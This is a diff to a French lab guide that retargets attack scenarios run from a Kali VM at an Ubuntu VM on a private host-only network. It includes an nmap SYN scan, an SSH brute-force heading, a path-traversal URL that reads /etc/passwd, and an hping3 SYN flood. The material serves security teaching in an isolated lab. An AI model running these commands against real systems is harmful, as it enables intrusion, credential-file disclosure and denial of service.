@@ -44,12 +44,12 @@ on peut choisir arbitrairement le nombre de ligne que l'on veut voir (20 ou 30 s
 Prérequis : les deux VM (Ubuntu et Kali) doivent être démarrées et sur le même
 réseau privé hôte. Vérifier la connexion :
 ```bash
-ping -c 3 192.168.56.102
+ping -c 3 192.168.56.10
 ```
 
 ### Scénario 1 — Scan de ports (nmap)
 ```bash
-nmap -sS 192.168.56.102
+nmap -sS 192.168.56.10
 ```
 
 ### Scénario 2 — Brute force SSH (hydra)
@@ -80,7 +80,7 @@ http://192.168.56.10/vulnerabilities/fi/?page=../../../../etc/passwd
 
 ### Scénario 5 — SYN flood (hping3)
 ```bash
-sudo hping3 -S --flood -p 80 192.168.56.102
+sudo hping3 -S --flood -p 80 192.168.56.10
 ```
 Laisser tourner 5 à 10 secondes puis `Ctrl+C`. Attention : peut ralentir la VM
 Ubuntu, c'est l'effet recherché.
